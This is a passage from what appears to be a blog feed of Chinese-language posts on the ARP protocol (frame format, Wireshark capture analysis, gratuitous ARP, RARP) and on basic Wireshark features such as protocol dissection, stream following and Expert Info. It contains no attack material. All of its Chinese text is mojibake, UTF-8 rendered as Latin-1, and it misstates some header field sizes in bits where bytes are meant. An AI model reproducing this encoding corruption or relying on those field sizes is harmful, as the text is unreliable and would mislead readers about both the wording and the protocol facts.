åœ°å€ï¼‰ï¼Œä¸çŸ¥é“å¯¹æ–¹çš„ MACåœ°å€ã€‚è¿™æ—¶å€™ï¼Œæœºå™¨ A ä¼šå‘é€ ARP æŠ¥æ–‡ï¼Œå»æŸ¥è¯¢æœºå™¨ B çš„ MAC åœ°å€ï¼Œæ‹¿åˆ° MACåœ°å€ï¼Œå°±èƒ½å®Œæˆé€šä¿¡çš„è¿‡ç¨‹ã€‚</p><p>ARP åè®®çš„å†…å®¹ï¼Œä»¥åŠæ€ä¹ˆæ‹¿åˆ° MAC åœ°å€å°±æ˜¯è¿™ç¯‡æ–‡ç« æ¥ä¸‹æ¥è¦è®²è§£çš„ã€‚</p><h2 id="åŸç†">åŸç†</h2><ol type="1"><li>æœºå™¨ A æƒ³å’ŒåŒä¸€ä¸ªä»¥å¤ªç½‘ç»œçš„æœºå™¨ B é€šä¿¡ï¼ŒA ä¼šç°åœ¨è‡ªå·±çš„ ARP è¡¨ä¸­æŸ¥æ‰¾B çš„ MACåœ°å€ï¼Œå¦‚æœèƒ½æ‰¾åˆ°å°±ç›´æ¥å‘é€ä»¥å¤ªç½‘å¸§ï¼›å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±è·³åˆ°ç¬¬äºŒæ­¥</li><li>æœºå™¨ A å‘é€ ARP è¯·æ±‚æŠ¥æ–‡å»æŸ¥è¯¢æœºå™¨ B çš„ MACåœ°å€ï¼Œè¿™æ˜¯ä¸ªä»¥å¤ªç½‘å¹¿æ’­æŠ¥æ–‡ï¼Œå› æ­¤äº¤æ¢æœºä¼šå¹¿æ’­åˆ°ç½‘ç»œä¸­æ‰€æœ‰çš„æœºå™¨</li><li>å„ä¸ªä¸»æœºæ¥æ”¶åˆ° ARP è¯·æ±‚æŠ¥æ–‡ï¼Œå¦‚æœå‘ç° ARP æŠ¥æ–‡ä¸­è¯¢é—®çš„ IPåœ°å€å’Œè‡ªå·±ä¸åŒï¼Œåˆ™ç›´æ¥ä¸¢å¼ƒï¼›æœºå™¨ B å‘ç° ARP æŠ¥æ–‡ä¸­è¯¢é—®çš„ IPåœ°å€æ˜¯è‡ªå·±çš„ä¸»æœºåœ°å€ï¼Œåˆ™ç”Ÿæˆä¸€ä¸ª ARP åº”ç­”æŠ¥æ–‡ï¼ŒæŠŠè‡ªå·±çš„ MACåœ°å€å¡«åˆ°æŠ¥æ–‡ä¸­ï¼Œå‘é€ç»™æœºå™¨Aï¼Œè¿™ä¸ªæŠ¥æ–‡æ˜¯å•æ’­æŠ¥æ–‡ï¼Œä¸ä¼šå‘é€ç»™å…¶ä»–ä¸»æœºï¼›åŒæ—¶æœºå™¨ B ä¹Ÿä¼šæŠŠæœºå™¨ A çš„ARP è®°å½•ç¼“å­˜èµ·æ¥</li><li>æœºå™¨ A æ¥æ”¶åˆ° B å‘æ¥çš„ ARP åº”ç­”ï¼Œè¯»å–æŠ¥æ–‡ä¸­ B çš„ MAC åœ°å€ï¼Œä½¿ç”¨è¿™ä¸ªMAC åœ°å€å’Œæœºå™¨ B è¿›è¡Œåç»­çš„é€šä¿¡ï¼ŒåŒæ—¶æŠŠå®ƒç¼“å­˜åˆ°ç³»ç»Ÿä¸­</li></ol><h2 id="åè®®æ ¼å¼">åè®®æ ¼å¼</h2><p>ARP æŠ¥æ–‡æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äº IP åœ°å€è½¬æ¢ä¸º MAC åœ°å€æ¥è¯´ï¼ŒARPæŠ¥æ–‡é•¿åº¦ä¸º 28 å­—èŠ‚ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/arpformat.png"alt="ARP Format" /><figcaption aria-hidden="true">ARP Format</figcaption></figure><p>å„ä¸ªå­—æ®µçš„å«ä¹‰ä¸ºï¼š</p><ul><li><code>Hardware Type</code>ï¼šä¼ è¾“ ARPæŠ¥æ–‡çš„ç‰©ç†ç½‘ç»œç±»å‹ï¼Œæœ€å¸¸è§çš„æ˜¯ä»¥å¤ªç½‘ç±»å‹ï¼Œå¯¹åº”çš„å€¼æ˜¯ 1ã€‚è¿™ä¸ªå­—æ®µçš„é•¿åº¦æ˜¯2 å­—èŠ‚</li><li><code>Protocol Type</code>ï¼šç½‘ç»œæŠ¥æ–‡ç±»å‹ï¼Œå­—æ®µé•¿åº¦æ˜¯ 2å­—èŠ‚ã€‚æœ€å¸¸ç”¨çš„æ˜¯ IPv4 æŠ¥æ–‡ï¼Œå¯¹åº”çš„å€¼æ˜¯ 2048ï¼ˆåå…­è¿›åˆ¶ä¸º0x0800ï¼Œè¿™å’Œä»¥å¤ªç½‘å¸§ä¸­å¸§ç±»å‹å­—æ®µä½¿ç”¨çš„ IPæŠ¥æ–‡ç±»å‹ç›¸åŒï¼Œè¿™æ˜¯æœ‰æ„è®¾è®¡çš„ï¼‰</li><li><code>Hardware Address Length</code>ï¼ˆHardwaresizeï¼‰ï¼šç‰©ç†åœ°å€é•¿åº¦ï¼Œå­—æ®µé•¿åº¦æ˜¯ 1 æ¯”ç‰¹ã€‚ARP åè®®æŠ¥æ–‡ä¸­ç‰©ç†åœ°å€ï¼ˆMACåœ°å€ï¼‰æœ‰å¤šå°‘æ¯”ç‰¹ï¼Œå¯¹äºå¤§éƒ¨åˆ†ç½‘ç»œæ¥è¯´ï¼Œè¿™ä¸ªå€¼æ˜¯ 6ï¼ˆå› ä¸º MAC åœ°å€æ˜¯ 6ä¸ªå­—èŠ‚ï¼Œ48 æ¯”ç‰¹é•¿ï¼‰</li><li><code>Protocol Address Length</code>ï¼ˆProtocolsizeï¼‰ï¼šç½‘ç»œåœ°å€é•¿åº¦ï¼Œå­—æ®µé•¿åº¦æ˜¯ 1 æ¯”ç‰¹ã€‚è¡¨ç¤º ARP åè®®æŠ¥æ–‡ä¸­ç½‘ç»œåœ°å€ï¼ˆIPåœ°å€ï¼‰æœ‰å¤šå°‘æ¯”ç‰¹ï¼Œå¯¹äºå¤§éƒ¨åˆ†ç½‘ç»œæ¥è¯´ï¼Œè¿™ä¸ªå€¼æ˜¯ 4ï¼ˆå› ä¸º IPv4 åœ°å€æ˜¯ 4ä¸ªå­—èŠ‚ï¼Œ32 æ¯”ç‰¹ï¼‰</li><li><code>Opcode</code>ï¼šARP æŠ¥æ–‡çš„ç±»å‹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¼šçœ‹åˆ°å‡ ç§ä¸åŒçš„ ARPæŠ¥æ–‡ã€‚è¿™ä¸ªå­—æ®µå ç”¨ 2 ä¸ªæ¯”ç‰¹ï¼Œå€¼ä¸º 1 ä»£è¡¨ ARP è¯·æ±‚æŠ¥æ–‡ï¼Œå€¼ä¸º 2 ä»£è¡¨ ARPåº”ç­”æŠ¥æ–‡ï¼Œ3 ä»£è¡¨ RARP è¯·æ±‚æŠ¥æ–‡ï¼Œ4 ä»£è¡¨ RARP åº”ç­”æŠ¥æ–‡</li><li><code>Sender Hardware Address</code>ï¼šå½“å‰ ARPæŠ¥æ–‡çš„å‘é€æ–¹çš„ç‰©ç†åœ°å€ï¼ˆMAC åœ°å€ï¼‰</li><li><code>Send Protocol Address</code>ï¼šå½“å‰ ARPæŠ¥æ–‡å‘é€å‘çš„ç½‘ç»œåœ°å€ï¼ˆIPv4 åœ°å€ï¼‰</li><li><code>Target Hardware Address</code>ï¼šå½“å‰ ARPæŠ¥æ–‡æ¥æ”¶æ–¹çš„ç‰©ç†åœ°å€ï¼ˆMAC åœ°å€ï¼‰ï¼Œå¦‚æœæ˜¯ ARPæƒ…å†µï¼Œè¿™ä¸ªå­—æ®µä¸ºç©ºï¼ˆå› ä¸ºå‘é€æ–¹æ­£æ˜¯å› ä¸ºä¸çŸ¥é“å¯¹æ–¹çš„ MAC åœ°å€ï¼Œæ‰ä¼šä½¿ç”¨ARP æ¥è§£æï¼‰</li><li><code>Target Protocol Address</code>ï¼šå½“å‰ ARPæŠ¥æ–‡æ¥æ”¶æ–¹çš„ç½‘ç»œåœ°å€ï¼ˆIPv4 åœ°å€ï¼‰</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ ARP åè®®ç›®å‰æœ€å¸¸ç”¨çš„åœºæ™¯æ˜¯æŠŠ IP åœ°å€è½¬æ¢ä¸º MACåœ°å€ï¼Œä½†æ˜¯å®ƒè®¾è®¡ä¹‹åˆå´æ˜¯ä¸ºäº†æ›´ä¸€èˆ¬çš„åœºæ™¯ã€‚å®ƒçš„ç¡¬ä»¶ç±»å‹ã€åè®®ç±»å‹å°±æ˜¯ä¸ºäº†æŒ‡æ˜è¦è½¬æ¢åœ°å€çš„åŒæ–¹ï¼›è€Œç¡¬ä»¶åœ°å€é•¿åº¦å’Œåè®®åœ°å€é•¿åº¦æŒ‡å®šåŒæ–¹çš„åœ°å€é•¿åº¦ï¼ˆæ¯ç§åè®®çš„åœ°å€é•¿åº¦å¯ä»¥ä¼šå‘ç”Ÿå˜åŒ–ï¼‰ï¼Œå…¶å¯¹åº”çš„å°±æ˜¯å¤´éƒ¨æœ€åé¢å››ä¸ªåœ°å€é•¿åº¦ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒARPæœ¬èº«å¯ä»¥è½¬æ¢å…¶ä»–ç¡¬ä»¶åœ°å€å’Œç½‘ç»œåœ°å€ï¼Œè€Œä¸”å…è®¸å®ƒä»¬çš„åœ°å€é•¿åº¦æ˜¯å¯å˜çš„ã€‚è¿™å¯¼è‡´ARP åè®®ç°åœ¨çœ‹æ¥æ˜¯æœ‰ç‚¹å†—ä½™çš„ï¼Œæ¯•ç«Ÿ IPv4 å’Œ MACåœ°å€é•¿åº¦éƒ½æ˜¯å›ºå®šçš„ï¼Œæ²¡æœ‰å¿…è¦åœ¨åè®®ä¸­æŒ‡å®šã€‚</p><p>ARP å‘é€å‡ºå»ä¼šè¢«å°è£…åœ¨ä»¥å¤ªç½‘å¸§é‡Œï¼ŒARP æŠ¥æ–‡ä¸­æœ‰å‘é€ç«¯çš„ MACåœ°å€ï¼Œè€Œä»¥å¤ªç½‘å¸§çš„æŠ¥æ–‡å¤´éƒ¨ä¹ŸåŒ…å«äº†å‘é€ç«¯çš„ MACåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´æŠ¥æ–‡ä¸­æœ‰å®Œå…¨é‡å¤çš„ä¿¡æ¯ã€‚</p><h1 id="æŠ“åŒ…åˆ†æ">æŠ“åŒ…åˆ†æ</h1><p>ä¸‹é¢æ˜¯ä¸€å¯¹ ARP è¯·æ±‚ä¸å“åº”åŒ…</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/packet.png"alt="Packets" /><figcaption aria-hidden="true">Packets</figcaption></figure><p>æŠ¥æ–‡åˆ—è¡¨çš„ <code>Info</code> å­—æ®µï¼Œå¯¹åº”çš„å†…å®¹æ˜¯ï¼š</p><blockquote><p>Who has 10.0.0.254? Tell 10.0.0.6</p><p>10.0.0.254 is at 00ï¼š00ï¼š39ï¼šcfï¼šd9ï¼šcd</p></blockquote><p>è¿™æ˜¯ wireshark å¸®æˆ‘ä»¬è§£æ ARPæŠ¥æ–‡ï¼Œå¹¶ç”¨è‹±è¯­è¡¨è¾¾å‡ºæ¥ã€‚è¿™å¥è¯ç”ŸåŠ¨åœ°æ¦‚æ‹¬äº† ARPè¯·æ±‚çš„æ„æ€ï¼š<strong>è°çŸ¥é“ 10.0.0.254 çš„ç‰©ç†åœ°å€ï¼Ÿå‘Šè¯‰10.0.0.6</strong>. ARP å“åº”çš„æ„æ€ï¼š<strong>10.0.0.254 çš„ç‰©ç†åœ°å€æ˜¯00ï¼š00ï¼š39ï¼šcfï¼šd9ï¼šcd</strong>.</p><p>ç¬¬ä¸€ä¸ªåŒ…ï¼ˆè¯·æ±‚åŒ…ï¼‰ï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/arp_request.png"alt="First" /><figcaption aria-hidden="true">First</figcaption></figure><ol type="1"><li>æ•°æ®å¸§å¤§å° 42 å­—èŠ‚ï¼Œå…¨éƒ¨è¢«æ•è·</li><li>ä»¥å¤ªç½‘æºåœ°å€ä¸ºæœ¬åœ° MAC åœ°å€ï¼Œç›®çš„åœ°å€ä¸º å…¨ 1 çš„å¹¿æ’­åœ°å€ï¼Œç±»å‹ä¸ºARP</li><li>æ­¤æŠ¥æ–‡ä¸º ARP requestï¼Œç‰©ç†ç½‘ç»œç±»å‹ï¼šä»¥å¤ªç½‘ï¼Œè¯·æ±‚ IP: 10.0.0.254 çš„MAC åœ°å€</li></ol><p>ç¬¬äºŒä¸ªåŒ…ï¼ˆå“åº”åŒ…ï¼‰ï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/arp_reply%20.png"alt="Second" /><figcaption aria-hidden="true">Second</figcaption></figure><ol type="1"><li>æ•°æ®å¸§å¤§å° 60 å­—èŠ‚ï¼Œå…¨éƒ¨è¢«æ•è·</li><li>ä»¥å¤ªç½‘ç›®çš„åœ°å€ä¸ºæœ¬æœºåœ°å€ï¼Œæºåœ°å€å³ä¸ºæ‰€æŸ¥è¯¢ IP çš„ä¸»æœºçš„ MAC åœ°å€</li><li>æ­¤æŠ¥æ–‡ä¸º ARP å“åº”æŠ¥æ–‡ï¼Œç‰©ç†ç½‘ç»œç±»å‹ï¼šä»¥å¤ªç½‘ï¼Œç›®çš„ IP åŠ MACå‡å¯¹åº”æˆ‘çš„ä¸»æœºï¼Œæº IP ä¸ºæˆ‘ä¸»æœºè¯·æ±‚ IPï¼Œæº MAC å³ä¸º è¯¥ IP å¯¹åº” MACåœ°å€ã€‚</li></ol><h2 id="cache-validation-æŠ¥æ–‡">cache validation æŠ¥æ–‡</h2><p>æŠ“åŒ…çš„æ—¶å€™è¿˜çœ‹åˆ°äº†æœ‰ä¸€å¯¹ ARP æŠ¥æ–‡ï¼Œå®ƒä»¬æ˜¯ä»æœºå™¨ B å‘æ¥æŸ¥è¯¢æœºå™¨ A MACåœ°å€çš„ã€‚ä½† ARP è¯·æ±‚æŠ¥æ–‡ä»¥å¤ªç½‘å¸§çš„ç›®çš„åœ°å€ä¸æ˜¯å¹¿æ’­ï¼Œè€Œæ˜¯æœºå™¨ A çš„ MACåœ°å€ï¼ŒåŸå› æ˜¯ä¸ºäº†<strong>éªŒè¯ç¼“å­˜çš„æœ‰æ•ˆæ€§</strong>ï¼å…·ä½“å¯æŸ¥çœ‹ä¸‹é¢çš„å‚è€ƒé“¾æ¥ï¼Œ</p><h2 id="gratuitous-arp">Gratuitous ARP</h2><p>é™¤äº†æ ‡å‡†çš„ ARP ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„ ARP æŠ¥æ–‡ï¼Œç§°ä¸º GratuitousARPï¼ˆå…è´¹ ARPï¼‰ã€‚è¿™ä¸ªæŠ¥æ–‡ä¹Ÿæ˜¯å¹¿æ’­æŠ¥æ–‡ï¼Œå®ƒçš„ç‰¹æ®Šæ€§åœ¨äºï¼Œå®ƒçš„æŠ¥æ–‡ä¸­å‘é€ç«¯IP åœ°å€å’Œæ¥æ”¶ç«¯ IP åœ°å€éƒ½è¢«è®¾ç½®ä¸ºå‘é€è¯¥æŠ¥æ–‡çš„ä¸»æœºIPã€‚ä¸ºä»€ä¹ˆè¦æœ‰è¿™æ ·ä¸€ä¸ªç‰¹æ®Šçš„æŠ¥æ–‡å‘¢ï¼Ÿå› ä¸ºå®ƒæœ‰ç”¨ï¼Œæ¯”å¦‚ï¼š</p><ul><li>æ£€æµ‹ IP å†²çªã€‚å¦‚æœå…è´¹ ARPè¯·æ±‚æ¥æ”¶åˆ°åº”ç­”ï¼Œè¯´æ˜å½“å‰ç½‘ç»œä¸Šæœ‰å¦å¤–ä¸€ä¸ªå’Œå‘é€æœºå™¨æœ‰ç›¸åŒ IP çš„ä¸»æœº</li><li>å¯ä»¥ç”¨æ¥æ›´æ–°ç½‘ç»œä¸­å½“å‰æœºå™¨çš„ ARP ç¼“å­˜ã€‚å¦‚æœæœºå™¨é‡æ–°é…ç½®äº† IPåœ°å€ï¼Œé‚£ä¹ˆå…è´¹ ARP æŠ¥æ–‡èƒ½å¤ŸæŠŠæ–°çš„ IP-MACåŒ¹é…å…³ç³»å¹¿æ’­åˆ°ç½‘ç»œä¸­ï¼Œæ¥æ”¶åˆ°æŠ¥æ–‡çš„æœºå™¨æ›´æ–°è‡ªå·±çš„ ARPç¼“å­˜è®°å½•ï¼Œè¿™æ ·å°±ä¸ä¼šæœ‰å› ä¸º ARP ç¼“å­˜å¤±æ•ˆå¯¼è‡´çš„ç½‘ç»œé—®é¢˜</li></ul><p>å¦‚æœæœºå™¨ A é‡æ–°é…ç½®äº† IP åœ°å€ï¼Œé‚£ä¹ˆ MAC ä¸ IPçš„å¯¹åº”å…³ç³»å°±å‘ç”Ÿäº†å˜åŒ–ï¼Œç½‘ç»œä¸­ä¿å­˜çš„æ—§ ARPè¡¨é¡¹éƒ½å¤±æ•ˆï¼Œæ— æ³•ç»§ç»­ä½¿ç”¨ï¼Œä¼šå¯¼è‡´ ping é”™è¯¯ã€‚Linux ç³»ç»Ÿä¸­å¯ä»¥ä½¿ç”¨<code>arping</code> å‘½ä»¤è¡Œæ¥å‘é€ GratuitousARPï¼Œè®©ç½‘ç»œä¸­æ‰€æœ‰ä¸»æœºæ›´æ–°å½“å‰æœºå™¨çš„ ARP è®°å½•ã€‚</p><h2 id="rarp">RARP</h2><p>åœ¨æŠ“åŒ…æµ‹è¯• ARP åè®®æ—¶ï¼ŒæŠ“åˆ°äº† RARPçš„åŒ…ï¼Œäºæ˜¯ç»è¿‡ä¸€ç•ªæŸ¥é˜…åï¼Œç®€è¦ä»‹ç»ä¸€ä¸€ä¸‹ RARPåè®®ï¼ˆé¦–å…ˆä½ è¦çŸ¥é“ï¼Œå®ƒå·²ç»è¿‡æ—¶äº†ï¼‰ã€‚</p><p>RARPï¼ˆReverse Address ResolutionProtocolï¼‰æ˜¯ä¸€ä¸ª<strong>è¿‡æ—¶</strong>çš„è¢«å±€åŸŸç½‘ä¸­çš„å®¢æˆ·æœºç”¨æ¥å‘ç½‘å…³è·¯ç”±å™¨çš„ARP è¡¨è¯·æ±‚è‡ªå·±çš„ IPv4 åœ°å€çš„ç½‘ç»œåè®®ã€‚ç½‘ç»œç®¡ç†å‘˜åœ¨ç½‘å…³è·¯ç”±å™¨ä¸Šåˆ›å»ºäº† ARPè¡¨ï¼Œç”¨æ¥æ˜ å°„ MAC åœ°å€ä¸ IP åœ°å€ã€‚</p><p>å½“ä¸€å°æ–°çš„æœºå™¨è¢«åˆ›å»ºæˆ–ä»»ä½•æ²¡æœ‰å†…å­˜å­˜å‚¨è‡ªå·±çš„ IP åœ°å€çš„æœºå™¨éœ€è¦ä¸€ä¸ª IPåœ°å€ä¾›è‡ªå·±ä½¿ç”¨æ—¶ï¼Œè¿™å°æœºå™¨ï¼ˆç§°å…¶ä¸º Aï¼‰å‘é€ RARPå¹¿æ’­åŒ…ï¼Œå…¶ä¸­å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„ MAC éƒ½æ˜¯å®ƒè‡ªå·±çš„ MAC åœ°å€ã€‚</p><p>åœ¨å±€åŸŸç½‘ä¸­ï¼Œæœ‰ä¸€å°ä¸»æœºè¢«å•ç‹¬é…ç½®ä¸º RARPæœåŠ¡å™¨ï¼Œå®ƒè´Ÿè´£å›åº”è¿™ç§å¹¿æ’­åŒ…ã€‚RARP æœåŠ¡å™¨æ”¶åˆ°å¹¿æ’­åŒ…ä¹‹åï¼Œåœ¨ ARPè¡¨ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæœ‰åŒ¹é…çš„è¡¨é¡¹ï¼Œåˆ™å°† IP åœ°å€æ”¾åœ¨è¿”å›åŒ…ä¸­ï¼Œè¿”å›ç»™ Aã€‚</p><p>RARP åœ¨å¦‚ä»Šçš„ç½‘ç»œä¸­å·²ç»ä¸è¢«ä½¿ç”¨ï¼Œå› ä¸ºæœ‰æ›´åŠ é«˜æ•ˆçš„åè®®æ¯”å¦‚ï¼šBOOTPï¼ˆBoostrap Protocolï¼‰ å’Œ DHCPã€‚ RARP å¯ä»¥æ»¡è¶³ä¸»æœº IPåœ°å€é…ç½®çš„éƒ¨åˆ†è¦æ±‚ï¼Œä½†æ˜¯ä¸èƒ½å®Œå…¨æ»¡è¶³åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹é…ç½®ï¼šç½‘ç»œæ©ç ï¼Œç½‘å…³åœ°å€ï¼Œé™æ€è·¯ç”±ï¼ŒDNSæœåŠ¡å™¨ï¼Œä»¥åŠç§æœ‰çš„ï¼Œå…¬æœ‰çš„ option åŠŸèƒ½ã€‚ RARPæ˜¯äºŒå±‚åè®®ï¼Œæ— æ³•ç©¿é€å­ç½‘ï¼ŒDHCP å¯ä»¥ç©¿é€å­ç½‘ã€‚</p><h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1><blockquote><ul><li><a href="https://cizixs.com/2017/07/31/arp-protocol/">ARPåè®®è§£æ</a>ï¼ˆæåŠ›æ¨èï¼‰</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œåè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒ. Wiresharkçš„åŸºæœ¬åŠŸèƒ½</title>
      <link href="/blog/2019/07/07/wireshark/basic_funciton/"/>
      <url>/blog/2019/07/07/wireshark/basic_funciton/</url>
      
        <content type="html"><![CDATA[<h2 id="åè®®è§£æ">åè®®è§£æ</h2><p>Wiresharkæœ€å¼ºå¤§çš„åŠŸèƒ½ä¹‹ä¸€å°±æ˜¯åè®®è§£æåŠŸèƒ½ï¼Œåè®®è§£ææ˜¯ç”±åè®®è§£æå™¨å®Œæˆã€‚å®ƒå°†åŸå§‹æ•°æ®åŒ…æ‹†åˆ†ä¸ºç›¸å…³æ•°æ®æ®µï¼Œå¹¶æŒ‰ç…§åè®®æ ¼å¼è§£æä¸º</p><p>å®ƒæ˜¯åŸå§‹æ•°æ®æµä¸åè®®çš„ç¿»è¯‘å™¨ã€‚å¦‚æœé‡åˆ°æ–°çš„åè®®å¯ä»¥ç”¨ C è¯­è¨€æˆ– Pythonç¼–å†™è§£æç¨‹åºã€‚æ³¨æ„ï¼š Wiresharkè¿›è¡Œåè®®è§£ææ—¶ï¼Œå¹¶ä¸è§å¾—æ¯æ¬¡éƒ½ä¼šé€‰æ‹©æ­£ç¡®çš„åè®®è§£æå™¨ï¼Œå°¤å…¶æ˜¯å½“ç½‘ç»œä¸Šçš„ä¸€ä¸ªåè®®ä½¿ç”¨äº†ä¸åŒäºæ ‡å‡†çš„é…ç½®çš„æ—¶å€™ï¼Œä¸€æ—¦é‡åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å°±éœ€è¦æ‰‹åŠ¨æ›´æ”¹ã€‚æ¯”å¦‚ï¼šFTPåè®®åŸæœ¬åº”è¯¥ä½¿ç”¨ 20ï¼Œ21 ç«¯å£ï¼Œå´ä½¿ç”¨äº† HTTPS çš„ 443ç«¯å£ï¼Œè¿™æ ·å¯èƒ½å°†å…¶è§£æä¸º HTTPS åè®®ï¼Œæ­¤æ—¶ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹ SSLæ•°æ®åŒ…ä¸­çš„æ•°æ®å­—èŠ‚åŒºçš„ ASCIIç éƒ¨åˆ†æ˜¯å¦æœ‰ç›¸å…³æœ‰æ„ä¹‰çš„æ˜æ–‡å‡ºç°ï¼Œæ ¹æ®å…¶ä¸­æ˜¾ç¤ºçš„ FileZilla Serverç­‰æ˜æ–‡ï¼Œåˆ¤æ–­ä¸º FTPåè®®ã€‚æ­¤æ—¶ï¼Œå¯ä»¥åœ¨éœ€è¦è½¬åŒ–ç±»å‹çš„æ•°æ®æŠ¥ä¸Šå³é”®-&gt;è§£ç ä¸ºé€‰æ‹©åˆé€‚çš„åè®®è§£ç ï¼Œæ³¨æ„ï¼šè¿™æ ·çš„è®¾ç½®åªåœ¨æœ¬æ¬¡è½¯ä»¶ä½¿ç”¨æ—¶æœ‰æ•ˆï¼Œä¸‹æ¬¡å¯åŠ¨æ—¶å°±æ¢å¤è‡³åŸçŠ¶æ€äº†ã€‚</p><p>Wiresharkæ˜¯å¼€æºè½¯ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¸‹è½½æŸ¥çœ‹å…¶æºä»£ç æ¥æŸ¥çœ‹å…¶è§£æé”™è¯¯çš„åŸå› ã€‚</p><h2 id="æ•°æ®æµè¿½è¸ª">æ•°æ®æµè¿½è¸ª</h2><p>TCP æ•°æ®æŠ¥å¯ä»¥è¯´æ˜¯æ˜¯æˆ‘ä»¬æ—¥å¸¸åˆ†æä¸­æœ€å¸¸è§çš„äº†ï¼Œå› æ­¤ Wiresharkä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬åˆ†æï¼Œæä¾›äº†å°† TCPæ•°æ®æŠ¥é‡ç»„ä¸ºæ˜“äºé˜…è¯»çš„å½¢å¼ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ª TCPæ•°æ®åŒ…ä¸Šå³é”®é€‰æ‹©è¿½è¸ªæµ-&gt; TCP æµï¼ŒWiresharkä¾¿å°†ä¸ä¹‹ç›¸å…³çš„æ•°æ®åŒ…é‡ç»„ï¼Œå¼¹çª—æ˜¾ç¤ºå‡º HTTP æŠ¥æ–‡ã€‚</p><h2 id="ä¸“å®¶ä¿¡æ¯">ä¸“å®¶ä¿¡æ¯</h2><p>èœå•æ  -&gt; åˆ†æ -&gt; ä¸“å®¶ä¿¡æ¯</p><p>æ˜¯å†…ç½®äº Wiresharkè½¯ä»¶ä¸­æœ€å¼ºå¤§çš„å·¥å…·ä¹‹ä¸€ï¼Œä¸ä½†èƒ½åœ¨æŠ“åŒ…è¿‡ç¨‹ä¸­è‡ªåŠ¨è¯†åˆ«ç½‘ç»œä¸­å‘ç”Ÿçš„å¼‚å¸¸ï¼Œç”šè‡³è¿˜èƒ½ç»™å‡ºå¯¼è‡´å¼‚å¸¸çŠ¶å†µçš„åŸå› ï¼ŒWireshark ä¼šæŠŠè¯†åˆ«å‡ºæ¥çš„äº‹ä»¶æŒ‰å‡ºæ•…éšœæ¦‚ç‡çš„é«˜ä½ï¼Œé€šè¿‡ Expert Infoå·¥å…·ä»¥äº‹ä»¶ç±»åˆ«çš„æ–¹å¼åŠ ä»¥æ˜¾ç¤ºï¼ŒåŒæ—¶è¿˜ä½¿ç”¨äº†é¢œè‰²æ¥åŠ ä»¥åŒºåˆ†ã€‚</p><p>ä¿¡æ¯ç±»åˆ«ï¼š</p><ol type="1"><li><p>Errorsï¼šæ‰€æŠ“æ•°æ®è¯†åˆ«å‡ºçš„ä¸¥é‡é”™è¯¯ï¼Œæ¯”å¦‚ï¼Œæ„ŸçŸ¥åˆ°ç•¸å½¢ï¼ˆæ ‡å‡†åŒ–é…ç½®ä¸å¯¹ï¼‰SPOOLSSæˆ– GTPåè®®æ•°æ®åŒ…ï¼Œåˆæˆ–è€…è¯†åˆ«åˆ°æŸäº›æ•°æ®åŒ…çš„æŸç§åè®®å¤´éƒ¨çš„æŸäº›å­—æ®µå€¼è·Ÿé¢„æœŸä¸ç¬¦ï¼ˆæ¯”å¦‚ï¼ŒIPv4æ•°æ®åŒ…çš„ IP åŒ…å¤´ä¸­æ ¡éªŒå’Œå­—æ®µå€¼è·Ÿé¢„æœŸå€¼ä¸ç¬¦åˆï¼Œå³ IPv4æ•°æ®åŒ…é€šä¸è¿‡æ ¡éªŒå’Œæ£€æŸ¥ï¼‰</p><p>æ³¨æ„ï¼šå·å‡ºç°ä¸€ä¸¤ä¸ªç•¸å½¢åŒ…æ—¶æ²¡é—®é¢˜ï¼Œå› ä¸º Wireshark çš„è¯†åˆ«å™¨ä¹Ÿä¸æ˜¯100%å‡†ç¡®çš„ã€‚</p></li><li><p>Warningsï¼šæ‰€æŠ“æ•°æ®è¯†åˆ«å‡ºçš„ä¸€èˆ¬æ€§é—®é¢˜</p></li><li><p>Notesï¼šæ‰€æŠ“æ•°æ®è¯†åˆ«å‡ºçš„å¯èƒ½ä¼šå¼•å‘æ•…éšœçš„å¼‚å¸¸ç°è±¡</p></li><li><p>Chatsï¼šæ­¤æ ‡ç­¾ä¸‹çš„æ•°æ®åŒ…éƒ½ç¬¦åˆå¸¸è§„æµé‡ç‰¹å¾</p></li><li><p>Detailsï¼šæ­¤æ ‡ç­¾æ˜¾ç¤º Chats æ ‡ç­¾äº‹ä»¶çš„è¯¦æƒ…</p></li><li><p>Packet 